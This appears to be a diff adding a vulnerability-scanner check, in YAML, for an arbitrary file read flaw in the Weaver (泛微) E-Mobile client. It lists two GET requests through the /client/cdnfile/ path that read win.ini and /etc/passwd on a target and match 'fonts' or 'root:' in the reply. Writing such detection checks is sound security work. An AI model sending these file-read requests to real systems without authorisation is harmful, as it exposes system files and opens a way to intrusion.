@@ -1,0 +1,16 @@
+name: 泛微E-Mobile-client-文件读取
+description: >
+  任意文件读取
+alwaysExecute: false
+matchCount: 1
+rules:
+  - method: GET
+    path: /client/cdnfile/1C/Windows/win.ini?windows
+    expression:
+      status: 200
+      body_all: ["fonts"]    
+  - method: GET
+    path: /client/cdnfile/C/etc/passwd?linux
+    expression:
+      status: 200
+      body_all: ["root:"]  
